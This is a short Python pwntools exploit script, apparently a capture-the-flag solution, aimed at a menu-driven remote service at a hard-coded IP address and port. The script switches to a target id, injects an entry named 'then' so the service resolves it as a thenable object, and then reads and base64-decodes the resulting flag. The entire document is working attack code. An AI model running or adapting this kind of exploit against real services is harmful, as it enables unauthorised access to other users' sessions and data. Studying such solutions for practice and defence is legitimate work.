from pwn import remote
import re
import time
from base64 import b64decode

HOST = "185.205.203.123"
PORT = 1204
TARGET_ID = "a94e9c000a02f03a"
PIN = b"12345"

def extract_id(text):
    m = re.search(r"id:\s*([0-9a-f]{16})", text)
    return m.group(1)


def menu_send(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())

conn = remote(HOST, PORT)
menu_send(conn, 1)
conn.sendlineafter(b": ", b"meowwwww")
menu_send(conn, 7)
conn.sendlineafter(b": ", PIN)
response = conn.recvline().decode()
current_id = extract_id(response)
menu_send(conn, 8)
conn.sendlineafter(b": ", TARGET_ID.encode())
menu_send(conn, 2)
conn.sendlineafter(b": ", b"Base64 Encode")
conn.sendlineafter(b": ", b"then")
menu_send(conn, 8)
conn.sendlineafter(b": ", current_id.encode())
menu_send(conn, 6)
conn.sendlineafter(b": ", PIN)
print("[*] Waiting for Thenable object to automatically resolve...")
time.sleep(1.5)
menu_send(conn, 3)
time.sleep(1.5)
menu_send(conn, 5)
result_line = conn.recvline().decode().strip()
print(f"[+] Raw Output: {result_line}")
encoded = re.findall(r'"([^"]+)"', result_line)[0]
flag = b64decode(encoded).decode()
print(f"[+] Decoded Flag: {flag}")